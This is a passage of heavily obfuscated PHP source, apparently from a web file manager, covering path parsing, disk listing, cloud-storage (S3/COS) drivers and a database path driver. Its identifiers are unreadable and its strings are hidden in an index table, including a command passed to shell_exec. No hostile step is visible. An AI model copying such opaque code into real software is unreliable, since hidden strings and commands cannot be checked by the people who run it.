=== $¯­â†‡Ó[1361] || $›İÈ ‡è[$ğ»½Ïì] === -1) { continue; } if ($›İÈ ‡è[$ğ»½Ïì] === $¯­â†‡Ó[12]) { $›İÈ ‡è[$ßß“ÔôÈ] = -1; break; } $›İÈ ‡è[$ßß“ÔôÈ] = -1; $›İÈ ‡è[$ğ»½Ïì] = -1; break; } } $Œøù²üã = array(); foreach ($›İÈ ‡è as $ç™´½„ñ) { if ($ç™´½„ñ !== -1) { $Œøù²üã[] = $ç™´½„ñ; } } $ì¶”–ôÜ = implode($¯­â†‡Ó[8], $Œøù²üã); if (strpos($ì¶”–ôÜ, $¯­â†‡Ó[1362]) === 0) { $ì¶”–ôÜ = $¯­â†‡Ó[1358] . substr($ì¶”–ôÜ, strlen($¯­â†‡Ó[1362])); } return $ì¶”–ôÜ; } public static function pathUrlClear($Ú£×ï˜Ş) { $É¸ÛŠë© =& $_SERVER[°‰†òö¯]; if (!$Ú£×ï˜Ş) { return $Ú£×ï˜Ş; } $Ú£×ï˜Ş = rawurldecode($Ú£×ï˜Ş); $Ú£×ï˜Ş = str_replace($É¸ÛŠë©[1360], $É¸ÛŠë©[8], $Ú£×ï˜Ş); if (strpos($Ú£×ï˜Ş, $É¸ÛŠë©[76]) > 0) { $Ú£×ï˜Ş = substr($Ú£×ï˜Ş, 0, strpos($Ú£×ï˜Ş, $É¸ÛŠë©[76])); } if (strpos($Ú£×ï˜Ş, $É¸ÛŠë©[1363]) > 0) { $Ú£×ï˜Ş = substr($Ú£×ï˜Ş, 0, strpos($Ú£×ï˜Ş, $É¸ÛŠë©[1363])); } return $Ú£×ï˜Ş; } public static function sourceID($ºàğôò¨) { $ª£Ø§Î¢ =& $_SERVER[°‰†òö¯]; $†ê˜Ö«† = self::parse($ºàğôò¨); if ($†ê˜Ö«†[$ª£Ø§Î¢[33]] !== self::KOD_SOURCE) { show_json(LNG($ª£Ø§Î¢[1364]), !1); } return $†ê˜Ö«†[$ª£Ø§Î¢[477]]; } public static function make($ö‘’çåÀ) { if (!$ö‘’çåÀ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ö‘’çåÀ)); } public static function makeShare($àøê¼Šê, $ïëö¹—) { return self::makePath(self::KOD_SHARE_ITEM, $àøê¼Šê, $ïëö¹—); } public static function makeFileTypePath($öÁÔôê‰) { return self::makePath(self::KOD_USER_FILE_TYPE, $öÁÔôê‰); } public static function makeFileTagPath($£Øµ×è¹) { return self::makePath(self::KOD_USER_FILE_TAG, $£Øµ×è¹); } public static function makePath($ğŒÈË³Ñ, $ä™ˆìã = '', $ü‹äŞîĞ = '') { $‚Ö´±áû =& $_SERVER[°‰†òö¯]; $¾ÌéæÂÁ = substr($ğŒÈË³Ñ, 1, -1); $”­êï²Š = $‚Ö´±áû[1365] . $¾ÌéæÂÁ . $‚Ö´±áû[1366] . $ä™ˆìã . $‚Ö´±áû[1367]; $”­êï²Š = $ü‹äŞîĞ ? $”­êï²Š . $ü‹äŞîĞ . $‚Ö´±áû[8] : $”­êï²Š; return $”­êï²Š; } public static function hashPath($¨ø ú¨³, $½§á¬ = true) { $© ¾Ä¼Ö =& $_SERVER[°‰†òö¯]; $ àèÕÂ = is_array($¨ø ú¨³) ? $¨ø ú¨³ : IO::info($¨ø ú¨³); $½°×½¢™ = _get($ àèÕÂ, $© ¾Ä¼Ö[1368], $© ¾Ä¼Ö[12]); if (!$½°×½¢™ && isset($ àèÕÂ[$© ¾Ä¼Ö[237]])) { $½°×½¢™ = trim($ àèÕÂ[$© ¾Ä¼Ö[237]], $© ¾Ä¼Ö[121]); } if (!$½°×½¢™ && isset($ àèÕÂ[$© ¾Ä¼Ö[193]]) && $ àèÕÂ[$© ¾Ä¼Ö[193]]) { $ àèÕÂ = IO::info(KodIO::make($ àèÕÂ[$© ¾Ä¼Ö[193]])); $½°×½¢™ = _get($ àèÕÂ, $© ¾Ä¼Ö[1368], $© ¾Ä¼Ö[12]); } $ÄÚµ´£Ã = md5($ àèÕÂ[$© ¾Ä¼Ö[87]] . $ àèÕÂ[$© ¾Ä¼Ö[79]] . $ àèÕÂ[$© ¾Ä¼Ö[88]]); if (!$½°×½¢™ && file_exists($ àèÕÂ[$© ¾Ä¼Ö[87]])) { $½°×½¢™ = Cache::get($ÄÚµ´£Ã . $© ¾Ä¼Ö[1369]); $½°×½¢™ = !1; if (!$½°×½¢™) { $½°×½¢™ = IO::hashSimple($ àèÕÂ[$© ¾Ä¼Ö[87]]); Cache::set($ÄÚµ´£Ã . $© ¾Ä¼Ö[1369], $½°×½¢™, 3600 * 24 * 30); } } if ($½§á¬ && !$½°×½¢™) { } return $½°×½¢™ ? $½°×½¢™ : $ÄÚµ´£Ã; } public static function hashPathSafe($“ºÂÙòÑ, $µÅó¾½ = true) { $„ÅÆ¸Ë£ =& $_SERVER[°‰†òö¯]; $›™ÛÏï­ = self::hashPath($“ºÂÙòÑ, $µÅó¾½); return md5($›™ÛÏï­ . $„ÅÆ¸Ë£[1370] . Model($„ÅÆ¸Ë£[831])->get($„ÅÆ¸Ë£[832])); } public static function initSystemPath() { $÷îí÷µì =& $_SERVER[°‰†òö¯]; if (defined($÷îí÷µì[1371])) { return; } define($÷îí÷µì[1371], self::systemPath($÷îí÷µì[191])); define($÷îí÷µì[1372], self::systemPath($÷îí÷µì[1373])); define($÷îí÷µì[1374], self::systemPath($÷îí÷µì[1375])); define($÷îí÷µì[1376], self::systemPath($÷îí÷µì[1377])); IOHistory::bindEvent(); } public static function systemPath($Ë‡ºäİâ) { $ˆÔüèğ² =& $_SERVER[°‰†òö¯]; $İìÈ°°· = $ˆÔüèğ²[1378] . ucfirst($Ë‡ºäİâ); $æŠœ‘Í = Model($ˆÔüèğ²[831])->get($İìÈ°°·); if ($æŠœ‘Í) { return $æŠœ‘Í; } if ($Ë‡ºäİâ == $ˆÔüèğ²[191]) { $æŠœ‘Í = self::make(Model($ˆÔüèğ²[891])->systemRootPathAdd($ˆÔüèğ²[612])); } else { $æŠœ‘Í = self::systemPath($ˆÔüèğ²[191]); $÷›¢îÎÎ = self::sourceID($æŠœ‘Í); $æŠœ‘Í = self::make(Model($ˆÔüèğ²[891])->mkdir($÷›¢îÎÎ, $Ë‡ºäİâ)); } Model($ˆÔüèğ²[831])->set($İìÈ°°·, $æŠœ‘Í); return $æŠœ‘Í; } public static function systemFolder($ĞèØ§Ûş) { $˜·¹Ûİ¼ = IO_PATH_SYSTEM_SOURCE . $ĞèØ§Ûş; $¥ÊÄµ™ş = Cache::get($˜·¹Ûİ¼); if (!$¥ÊÄµ™ş) { $¶Â¶ñÏò = IO::infoFullSimple($˜·¹Ûİ¼); if (!$¶Â¶ñÏò) { $¥ÊÄµ™ş = IO::mkdir($˜·¹Ûİ¼, REPEAT_SKIP); } else { $¥ÊÄµ™ş = $¶Â¶ñÏò[$_SERVER[°‰†òö¯][87]]; } Cache::set($˜·¹Ûİ¼, $¥ÊÄµ™ş, 3600 * 10); } return $¥ÊÄµ™ş; } public static function defaultDriver() { return Model($_SERVER[°‰†òö¯][828])->defaultDriver(); } public static function defaultIO() { $ªé²‰Ñ =& $_SERVER[°‰†òö¯]; $°’âß ´ = self::defaultDriver(); return $ªé²‰Ñ[1379] . $°’âß ´[$ªé²‰Ñ[477]] . $ªé²‰Ñ[1367]; } public static function defaultDriverInit() { static $Š©ğ£×Õ = false; if ($Š©ğ£×Õ) { return $Š©ğ£×Õ; } $Š©ğ£×Õ = IO::init(self::defaultIO()); return $Š©ğ£×Õ; } public static function fileTypeList() { $œŠ¦­† =& $_SERVER[°‰†òö¯]; $„¿È·õ— = $GLOBALS[$œŠ¦­†[6]][$œŠ¦­†[1380]]; foreach ($„¿È·õ— as $¹¬ôÔ“‘ => $øüØÊÅ) { $©¯ê—®Ú = $œŠ¦­†[1381] . $¹¬ôÔ“‘; $ÀÓ£àí§ = LNG($©¯ê—®Ú); if ($©¯ê—®Ú != $ÀÓ£àí§) { $„¿È·õ—[$¹¬ôÔ“‘][$œŠ¦­†[32]] = $ÀÓ£àí§; } } return $„¿È·õ—; } public static function diskList($˜¹€ä˜Ò = true) { $ßğà°§ò = $_SERVER[°‰†òö¯][1382]; if ($˜¹€ä˜Ò) { $úÄºÒÃï = Cache::get($ßğà°§ò); if (is_array($úÄºÒÃï)) { return $úÄºÒÃï; } } $úÄºÒÃï = self::diskListGet(); Cache::set($ßğà°§ò, $úÄºÒÃï, 60); return $úÄºÒÃï; } public static function diskListGet() { $áâıš²ƒ =& $_SERVER[°‰†òö¯]; $…Àîê¸Ë = array(); if ($GLOBALS[$áâıš²ƒ[6]][$áâıš²ƒ[1383]] == $áâıš²ƒ[1384]) { $ÊÚÜ®‚ú = $áâıš²ƒ[1385]; for ($±›Îú = 0; $±›Îú < strlen($ÊÚÜ®‚ú); $±›Îú++) { $ºÅ¯šüä = $ÊÚÜ®‚ú[$±›Îú] . $áâıš²ƒ[1386]; if (file_exists($ºÅ¯šüä)) { $…Àîê¸Ë[] = $ºÅ¯šüä; } } return $…Àîê¸Ë; } if (!function_exists($áâıš²ƒ[101])) { $…Àîê¸Ë[] = $áâıš²ƒ[902]; return $…Àîê¸Ë; } $µšç—àæ = explode($áâıš²ƒ[287], shell_exec($áâıš²ƒ[1387])); array_shift($µšç—àæ); array_pop($µšç—àæ); $ŸöÁúò¹ = array($áâıš²ƒ[1388], $áâıš²ƒ[1389], $áâıš²ƒ[1390], $áâıš²ƒ[1391], $áâıš²ƒ[1392], $áâıš²ƒ[1393], $áâıš²ƒ[1394], $áâıš²ƒ[1395]); foreach ($µšç—àæ as $Ğş©¹Ëò) { $Òç¾®©„ = preg_split($áâıš²ƒ[1396], $Ğş©¹Ëò); $ºÅ¯šüä = $Òç¾®©„[count($Òç¾®©„) - 1]; if (!strstr($Òç¾®©„[0], $áâıš²ƒ[1397]) || !$ºÅ¯šüä) { continue; } $ÏŞÍ²Œæ = rtrim($ºÅ¯šüä, $áâıš²ƒ[8]) . $áâıš²ƒ[8]; if (in_array($ÏŞÍ²Œæ, $ŸöÁúò¹)) { continue; } $…Àîê¸Ë[] = $ÏŞÍ²Œæ; } return $…Àîê¸Ë; } public static function isSameDisk($ËÑ§†¥ı, $Åî¨äËÄ) { $±¬˜¬œÏ =& $_SERVER[°‰†òö¯]; if ($GLOBALS[$±¬˜¬œÏ[6]][$±¬˜¬œÏ[1383]] == $±¬˜¬œÏ[1384]) { return strtolower(substr($ËÑ§†¥ı, 0, 1)) == strtolower(substr($Åî¨äËÄ, 0, 1)); } $İÆš·ò = stat($ËÑ§†¥ı); $²û‹É²€ = stat($Åî¨äËÄ); if ($İÆš·ò === !1 || $²û‹É²€ === !1) { return !1; } return $İÆš·ò[$±¬˜¬œÏ[1398]] === $²û‹É²€[$±¬˜¬œÏ[1398]]; $ËÄ•Ï‡¢ = self::diskList(); $¿”ÅşŞë = !1; $¡ÎĞé“‰ = !1; sort($ËÄ•Ï‡¢); $ËÄ•Ï‡¢ = array_reverse($ËÄ•Ï‡¢); $ËÑ§†¥ı = rtrim($ËÑ§†¥ı, $±¬˜¬œÏ[8]) . $±¬˜¬œÏ[8]; $Åî¨äËÄ = rtrim($Åî¨äËÄ, $±¬˜¬œÏ[8]) . $±¬˜¬œÏ[8]; foreach ($ËÄ•Ï‡¢ as $ÛÆ¯˜‘Ñ) { $Ä“ˆó• = strlen($ÛÆ¯˜‘Ñ); if (!$¿”ÅşŞë && substr($ËÑ§†¥ı, 0, $Ä“ˆó•) == $ÛÆ¯˜‘Ñ) { $¿”ÅşŞë = $ÛÆ¯˜‘Ñ; } if (!$¡ÎĞé“‰ && substr($Åî¨äËÄ, 0, $Ä“ˆó•) == $ÛÆ¯˜‘Ñ) { $¡ÎĞé“‰ = $ÛÆ¯˜‘Ñ; } if ($¿”ÅşŞë && $¡ÎĞé“‰) { break; } } return $¿”ÅşŞë === $¡ÎĞé“‰; } public static function transferType($½À³ŒŒß, $ü¾·¬°Ó) { $†Ï©ù¼¥ =& $_SERVER[°‰†òö¯]; $­áòçÜ” = self::driverType($½À³ŒŒß); $™¶‚í‘Ã = self::driverType($ü¾·¬°Ó); if ($­áòçÜ”[$†Ï©ù¼¥[33]] == $™¶‚í‘Ã[$†Ï©ù¼¥[33]] && $­áòçÜ”[$†Ï©ù¼¥[1399]] == $™¶‚í‘Ã[$†Ï©ù¼¥[1399]]) { return $†Ï©ù¼¥[1400]; } if ($­áòçÜ”[$†Ï©ù¼¥[33]] == $†Ï©ù¼¥[936] && $™¶‚í‘Ã[$†Ï©ù¼¥[33]] == $†Ï©ù¼¥[109]) { return $†Ï©ù¼¥[1277]; } if ($­áòçÜ”[$†Ï©ù¼¥[33]] == $†Ï©ù¼¥[109] && $™¶‚í‘Ã[$†Ï©ù¼¥[33]] == $†Ï©ù¼¥[936]) { return $†Ï©ù¼¥[110]; } return $†Ï©ù¼¥[1401]; } public static function driverType($Ú¯½Àš) { $ˆµùşåÏ =& $_SERVER[°‰†òö¯]; $åÔÌ° = str_replace($ˆµùşåÏ[1402], $ˆµùşåÏ[12], strtolower($Ú¯½Àš->getType())); if ($åÔÌ° == $ˆµùşåÏ[818] || $åÔÌ° == $ˆµùşåÏ[1403] || $åÔÌ° == $ˆµùşåÏ[1404]) { $Ú¯½Àš = self::defaultDriverInit(); } else { if ($åÔÌ° == $ˆµùşåÏ[1287] || $åÔÌ° == $ˆµùşåÏ[1405]) { $Ú¯½Àš = IO::init($Ú¯½Àš->pathParse[$ˆµùşåÏ[1230]]); } } $ó¤ñ›À— = $Ú¯½Àš->path; $åÔÌ° = str_replace($ˆµùşåÏ[1402], $ˆµùşåÏ[12], strtolower($Ú¯½Àš->getType())); if ($åÔÌ° == $ˆµùşåÏ[109]) { return array($ˆµùşåÏ[33] => $ˆµùşåÏ[109], $ˆµùşåÏ[1399] => $ˆµùşåÏ[12], $ˆµùşåÏ[87] => $ó¤ñ›À—, $ˆµùşåÏ[98] => $Ú¯½Àš); } return array($ˆµùşåÏ[33] => $ˆµùşåÏ[936], $ˆµùşåÏ[1399] => $Ú¯½Àš->pathDriver, $ˆµùşåÏ[87] => $ó¤ñ›À—, $ˆµùşåÏ[98] => $Ú¯½Àš); } public static function pathDriverType($ÚªÇàğí) { return $ÚªÇàğí ? self::driverType(IO::init($ÚªÇàğí)) : !1; } public static function pathDriverLocal($Ô·ˆÔ¤) { $Üé­æ¬“ =& $_SERVER[°‰†òö¯]; $ë‡¢¯ = $Ô·ˆÔ¤ ? self::driverType(IO::init($Ô·ˆÔ¤)) : !1; return strtolower($ë‡¢¯[$Üé­æ¬“[33]]) == $Üé­æ¬“[109] ? !0 : !1; } public static function allowCover($Ò½¯‡‡±, $¯äŠç‰Ş = true) { $É úïŒá =& $_SERVER[°‰†òö¯]; if (is_string($Ò½¯‡‡±)) { $Ò½¯‡‡± = IO::info($Ò½¯‡‡±); } if (!$Ò½¯‡‡± || $Ò½¯‡‡±[$É úïŒá[33]] == $É úïŒá[78] || $Ò½¯‡‡±[$É úïŒá[79]] <= 100) { return !1; } if (isset($Ò½¯‡‡±[$É úïŒá[1406]]) || !$Ò½¯‡‡±[$É úïŒá[87]]) { return !1; } if (isset($Ò½¯‡‡±[$É úïŒá[234]]) && !$Ò½¯‡‡±[$É úïŒá[234]]) { return !1; } static $–ÓıÂÎ¼ = false; if (!$–ÓıÂÎ¼ || !$¯äŠç‰Ş) { $ßÉğ¿È = self::driverType(IO::init($Ò½¯‡‡±[$É úïŒá[87]])); $‡¾ûæä¥ = $ßÉğ¿È[$É úïŒá[98]]; $–ÓıÂÎ¼ = $É úïŒá[196]; if ($ßÉğ¿È[$É úïŒá[33]] == $É úïŒá[109]) { $–ÓıÂÎ¼ = $É úïŒá[1407]; } if ($ßÉğ¿È[$É úïŒá[98]] && is_array($ßÉğ¿È[$É úïŒá[98]]->config)) { $ÄİêÇ»ı = $ßÉğ¿È[$É úïŒá[98]]->config; if (isset($ÄİêÇ»ı[$É úïŒá[1408]]) && $ÄİêÇ»ı[$É úïŒá[1408]]) { $–ÓıÂÎ¼ = $É úïŒá[1407]; } } $Œ›Ø§ı— = KodIO::defaultDriver(); if (strtolower($Œ›Ø§ı—[$É úïŒá[98]]) == $É úïŒá[109] && is_array($Œ›Ø§ı—[$É úïŒá[6]])) { $û—û¶ò¯ = $Œ›Ø§ı—[$É úïŒá[6]][$É úïŒá[1260]]; if (substr($û—û¶ò¯, 0, 2) == $É úïŒá[1409]) { $û—û¶ò¯ = str_replace($É úïŒá[1409], BASIC_PATH, $û—û¶ò¯); } $û—û¶ò¯ = str_replace($É úïŒá[256], $É úïŒá[8], $û—û¶ò¯); if (substr($Ò½¯‡‡±[$É úïŒá[87]], 0, strlen($û—û¶ò¯)) == $û—û¶ò¯) { $–ÓıÂÎ¼ = $É úïŒá[196]; } } } return $–ÓıÂÎ¼ == $É úïŒá[1407] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($‡ÙëıÅò) { parent::__construct($‡ÙëıÅò); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($«”íòáù) { $½™¼ÔÂ¡ =& $_SERVER[°‰†òö¯]; if (substr($«”íòáù, 0, 7) == $½™¼ÔÂ¡[218]) { $«”íòáù = $½™¼ÔÂ¡[219] . substr($«”íòáù, 7); } header($½™¼ÔÂ¡[175] . $«”íòáù); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($˜•Ä¢×’) { parent::__construct($˜•Ä¢×’); $this->setSignVersion($_SERVER[°‰†òö¯][249]); } public function uploadFormData($”Š«ö , $Ø¼ÂŠÌ¡ = 3600) { $üùìäš =& $_SERVER[°‰†òö¯]; $Ú¡³©Í = $üùìäš[231]; $Øü—•ñé = $üùìäš[1410]; $ö¡ÏÇ±§ = $üùìäš[263]; $²Ü’¿ïË = gmdate($üùìäš[1411], time() + $Ø¼ÂŠÌ¡); $õ³£‚üÀ = (string) time() . $üùìäš[74] . (string) (time() + $Ø¼ÂŠÌ¡); $»€±Î š = array($üùìäš[264] => $²Ü’¿ïË, $üùìäš[267] => array(array($üùìäš[308] => $Ú¡³©Í), array($üùìäš[268] => $this->bucket), array($üùìäš[269], $üùìäš[270], $üùìäš[12]), array($üùìäš[272] => $ö¡ÏÇ±§), array($üùìäš[1412] => $Øü—•ñé), array($üùìäš[1413] => $this->accessKey), array($üùìäš[1414] => $õ³£‚üÀ))); $»€±Î š = json_encode($»€±Î š); $Ø«„¬û² = hash_hmac($üùìäš[1410], $õ³£‚üÀ, $this->secret); $£¥á±İ = sha1($»€±Î š); $ÒÅ¨õ¾¦ = hash_hmac($üùìäš[1410], $£¥á±İ, $Ø«„¬û²); $‚îà»ï… = array($üùìäš[308] => $Ú¡³©Í, $üùìäš[272] => $ö¡ÏÇ±§, $üùìäš[279] => base64_encode($»€±Î š), $üùìäš[1412] => $Øü—•ñé, $üùìäš[1413] => $this->accessKey, $üùìäš[1415] => $õ³£‚üÀ, $üùìäš[1416] => $ÒÅ¨õ¾¦, $üùìäš[208] => $this->getHost()); return $‚îà»ï…; } public function fileOutImage($ç²ÆŞ¥—, $È‚¿’è¬ = 250) { $ô²ÈÆÜğ =& $_SERVER[°‰†òö¯]; if ($this->size($ç²ÆŞ¥—) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ç²ÆŞ¥—, $È‚¿’è¬); } $¥½°¢ã = $this->link($ç²ÆŞ¥—); $¥½°¢ã .= $ô²ÈÆÜğ[1417] . $È‚¿’è¬ . $ô²ÈÆÜğ[1418]; $this->fileOutLink($¥½°¢ã); } public function fileOutLink($Â ëô) { $éÛŠ¡ ÷ =& $_SERVER[°‰†òö¯]; if (substr($Â ëô, 0, 7) == $éÛŠ¡ ÷[218]) { $Â ëô = $éÛŠ¡ ÷[219] . substr($Â ëô, 7); } header($éÛŠ¡ ÷[175] . $Â ëô); die; } } goto B™‰Ê–…×; dˆøÍ˜í†¤: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¶È§¼Ø‡) { $this->pathParse = $¶È§¼Ø‡; $this->model = Model($_SERVER[°‰†òö¯][1419]); } public function getPath($–œ¦Àª) { return trim($–œ¦Àª, $_SERVER[°‰†òö¯][8]); } public function pathFather($ƒşúö‰) { $×¡Šµ°ò = $this->parse($ƒşúö‰); $×¡Šµ°ò = $this->infoSimple($ƒşúö‰); return $×¡Šµ°ò ? $×¡Šµ°ò[$_SERVER[°‰†òö¯][192]] : !1; } public function pathThis($Íæéİè) { $²‚ÂòÄ× = $this->infoSimple($Íæéİè); return $²‚ÂòÄ× ? $²‚ÂòÄ×[$_SERVER[°‰†òö¯][32]] : !1; } public function getPathOuter($ÖÕò­ÍŒ) { if (!$ÖÕò­ÍŒ) { return $ÖÕò­ÍŒ; } $ı½®„Ï· = $this->parse($ÖÕò­ÍŒ); return KodIO::make($ı½®„Ï·[$_SERVER[°‰†òö¯][477]]); } public function copyFolderFromIO($Áè›‘™ç, $“•Ï®€à, $”œğ­Ñ–, $õñ°¥», $§ï¥ö´) { $ñêø÷ = $this->model->copyFolderFromIO($Áè›‘™ç, $“•Ï®€à, $”œğ­Ñ–, $õñ°¥», $§ï¥ö´); return KodIO::make($ñêø÷); } public function isParentOf($‚»å ¨¸, $Š‘ÅĞëÍ) { return $this->model->isParentOf($‚»å ¨¸, $Š‘ÅĞëÍ); } public function mkfile($»ªšÎèş, $ñ¨¾É‡ü = '', $ÒÄ¡ÑØ¹ = REPEAT_RENAME) { $“‰‡‡¨ =& $_SERVER[°‰†òö¯]; $î­ö‰¼† = $this->parse($»ªšÎèş); $»ªšÎèş = $î­ö‰¼†[$“‰‡‡¨[477]]; for ($ï™Í‰œß = 0; $ï™Í‰œß < count($î­ö‰¼†[$“‰‡‡¨[1420]]); $ï™Í‰œß++) { $¢ŸÃÍì¶ = $î­ö‰¼†[$“‰‡‡¨[1420]][$ï™Í‰œß]; if ($ï™Í‰œß == count($î­ö‰¼†[$“‰‡‡¨[1420]]) - 1) { $»ªšÎèş = $this->model->mkfile($»ªšÎèş, $¢ŸÃÍì¶, $ñ¨¾É‡ü, $ÒÄ¡ÑØ¹); break; } $»ªšÎèş = $this->model->mkdir($»ªšÎèş, $¢ŸÃÍì¶, REPEAT_SKIP); } return $this->getPathOuter($»ªšÎèş); } public function mkdir($ÊÜ‹ÖÂ , $›üÜ¨Ä = REPEAT_SKIP) { $¬„°°‚ú =& $_SERVER[°‰†òö¯]; $ç•ÒÜ½Í = $this->parse($ÊÜ‹ÖÂ ); $ÊÜ‹ÖÂ  = $ç•ÒÜ½Í[$¬„°°‚ú[477]]; for ($äß¡üş´ = 0; $äß¡üş´ < count($ç•ÒÜ½Í[$¬„°°‚ú[1420]]); $äß¡üş´++) { $‹áŸÒ›œ = $ç•ÒÜ½Í[$¬„°°‚ú[1420]][$äß¡üş´]; $ÊÜ‹ÖÂ  = $this->model->mkdir($ÊÜ‹ÖÂ , $‹áŸÒ›œ, $›üÜ¨Ä); } return $this->getPathOuter($ÊÜ‹ÖÂ ); } public function copyFile($Õ˜çÅ‘Š, $Ù¿ÑüüÂ, $†àÙö¼ã = REPEAT_REPLACE) { $çğĞ–ù” =& $_SERVER[°‰†òö¯]; $Ï«»½Ğú = $this->parse($Ù¿ÑüüÂ); $‡Ö¦ ƒÇ = $this->model->copy($Õ˜çÅ‘Š, $Ï«»½Ğú[$çğĞ–ù”[477]], $†àÙö¼ã, $Ï«»½Ğú[$çğĞ–ù”[87]]); return $‡Ö¦ ƒÇ ? $this->getPathOuter($‡Ö¦ ƒÇ) : !1; } public function moveFile($“«—ğÀ¿, $ÅÛãêÒÊ, $ÚÇ¬ÂµĞ = REPEAT_REPLACE) { $“êÆ¤° =& $_SERVER[°‰†òö¯]; $œ‰÷ŞÀ÷ = $this->parse($ÅÛãêÒÊ); $ßë”˜Š = $this->model->move($“«—ğÀ¿, $œ‰÷ŞÀ÷[$“êÆ¤°[477]], $ÚÇ¬ÂµĞ, $œ‰÷ŞÀ÷[$“êÆ¤°[87]]); return $ßë”˜Š ? $this->getPathOuter($ßë”˜Š) : !1; } public function copy($šè¢ãï, $¿±İßì­, $İïƒ§Îâ = REPEAT_REPLACE, $Ç¸Àô‡´ = false) { $¡î£‚”Ç = $this->parse($¿±İßì­); $Ä‚ÊÄãÛ = $this->model->copy($šè¢ãï, $¡î£‚”Ç[$_SERVER[°‰†òö¯][477]], $İïƒ§Îâ, $Ç¸Àô‡´); return $Ä‚ÊÄãÛ ? $this->getPathOuter($Ä‚ÊÄãÛ) : !1; } public function moveSameAllow() { } public function move($˜×•õË, $Ÿ²´ŒªÎ, $Ò¤¢Äù = REPEAT_REPLACE, $¹È´ôÛ = false) { $‹ø€†åÚ = $this->parse($Ÿ²´ŒªÎ); $×¨ş¤Óé = $this->model->move($˜×•õË, $‹ø€†åÚ[$_SERVER[°‰†òö¯][477]], $Ò¤¢Äù, $¹È´ôÛ); return $×¨ş¤Óé ? $this->getPathOuter($×¨ş¤Óé) : !1; } public function remove($Ûâ‚ÔÇ, $Äå­ª³ = true) { return $this->model->remove($Ûâ‚ÔÇ, $Äå­ª³); } public function rename($ğü¼ƒÒå, $€ÃÚ–Ìç) { $ÊÈºüõ’ = $this->model->rename($ğü¼ƒÒå, $€ÃÚ–Ìç); return $ÊÈºüõ’ ? $this->getPathOuter($ğü¼ƒÒå) : $ÊÈºüõ’; } public function size($Ô¥‘²ÏŠ) { $Á¯£ïØ = $this->infoSimple($Ô¥‘²ÏŠ); return $Á¯£ïØ ? $Á¯£ïØ[$_SERVER[°‰†òö¯][79]] : 0; } public function infoSimple($Ğº•…Ó¬) { return $this->model->sourceInfo($Ğº•…Ó¬); } public function info($‡Ü’üÇ) { return $this->infoParse($‡Ü’üÇ); } public function infoAuth($’„‘€•) { return $this->infoParse($’„‘€•, !1, !0); } public function infoWithChildren($¨ÈÔŞìÎ) { return $this->infoParse($¨ÈÔŞìÎ, !0); } protected function infoParse($“¸¾¶ëÙ, $èÎ›ã×² = false, $ú’ÇÄ“Ó = false) { if (!$èÎ›ã×²) { return $this->model->pathInfo($“¸¾¶ëÙ, $ú’ÇÄ“Ó); } return $this->model->pathInfoMore($“¸¾¶ëÙ); } public function infoFullSimple($ÏÍÚŒÑ÷) { $˜¥ØÃé¿ =& $_SERVER[°‰†òö¯]; $õŒ·´Ü = explode($˜¥ØÃé¿[8], $ÏÍÚŒÑ÷); $µèßª« = implode($˜¥ØÃé¿[8], array_splice($õŒ·´Ü, 1)); return $this->model->pathInfoByPath($õŒ·´Ü[0], $µèßª«); } public function infoFull($â©”Œ¬±) { $á î¢´á = $this->infoFullSimple($â©”Œ¬±); return is_array($á î¢´á) ? $this->model->pathInfo($á î¢´á[$_SERVER[°‰†òö¯][193]]) : !1; } public function hashSimple($éÕç¤è) { $Ô¤˜· =& $_SERVER[°‰†òö¯]; $’ã§×¸ê = $this->infoWithChildren($éÕç¤è); return $’ã§×¸ê[$Ô¤˜·[170]][$Ô¤˜·[679]]; } public function hashMd5($“šîé„§) { $ß¿ºéñ° =& $_SERVER[°‰†òö¯]; $Õ¨ƒŠ±¼ = $this->infoWithChildren($“šîé„§); return $Õ¨ƒŠ±¼[$ß¿ºéñ°[170]][$ß¿ºéñ°[551]]; } public function exist($ÒÑÂİ®) { $–ÒÎò§Ú =& $_SERVER[°‰†òö¯]; $–ıÂÓ¯ = $this->parse($ÒÑÂİ®); if (!$–ıÂÓ¯[$–ÒÎò§Ú[87]]) { return $this->isFile($ÒÑÂİ®) || $this->isFolder($ÒÑÂİ®); } $¿Ïû¸’Ã = array($–ÒÎò§Ú[479] => $–ıÂÓ¯[$–ÒÎò§Ú[477]], $–ÒÎò§Ú[32] => $–ıÂÓ¯[$–ÒÎò§Ú[87]]); $ÚäÄÑ‡™ = $this->model->where($¿Ïû¸’Ã)->find(); return $ÚäÄÑ‡™ ? !0 : !1; } public function isFile($ŒØ†©ï”) { $Â¿ÚÈ—Ÿ =& $_SERVER[°‰†òö¯]; $ÊÁ½üã = $this->infoSimple($ŒØ†©ï”); return $ÊÁ½üã && $ÊÁ½üã[$Â¿ÚÈ—Ÿ[487]] == $Â¿ÚÈ—Ÿ[230] ? !0 : !1; } public function isFolder($ğá³’ğ) { $’§›ßì =& $_SERVER[°‰†òö¯]; $–í†îá = $this->infoSimple($ğá³’ğ); return $–í†îá && $–í†îá[$’§›ßì[487]] == $’§›ßì[91] ? !0 : !1; } public function listPath($ÍÙ£¢ã¾, $¤ß™©’“ = false) { $ ­¦ççœ =& $_SERVER[°‰†òö¯]; if ($ÍÙ£¢ã¾ == $ ­¦ççœ[12]) { return !1; } $Ã±ËÃ§ = array($ ­¦ççœ[479] => $ÍÙ£¢ã¾); if ($¤ß™©’“) { return $this->model->listSource($Ã±ËÃ§, -1); } return $this->model->listSource($Ã±ËÃ§); } public function has($ùÕ¯Ø£±, $Ëª¿ÆíÙ = false, $òÔ…ç€ğ = null) { $ñ„ìüœ =& $_SERVER[°‰†òö¯]; $ÚéŒĞÇï = $this->infoWithChildren($ùÕ¯Ø£±); if ($Ëª¿ÆíÙ) { return array($ñ„ìüœ[242] => $ÚéŒĞÇï[$ñ„ìüœ[242]], $ñ„ìüœ[241] => $ÚéŒĞÇï[$ñ„ìüœ[241]]); } return $òÔ…ç€ğ ? $ÚéŒĞÇï[$ñ„ìüœ[242]] : $ÚéŒĞÇï[$ñ„ìüœ[241]]; } public function listAll($•”™ÌÙ) { $Òûß•Şß = IO::info($this->pathParse[$_SERVER[°‰†òö¯][87]]); if (!$Òûß•Şß) { return array(); } return $this->model->listAll($•”™ÌÙ); } public function getContent($¨§‘‘¥‡) { return $this->model->getContent($¨§‘‘¥‡); } public function 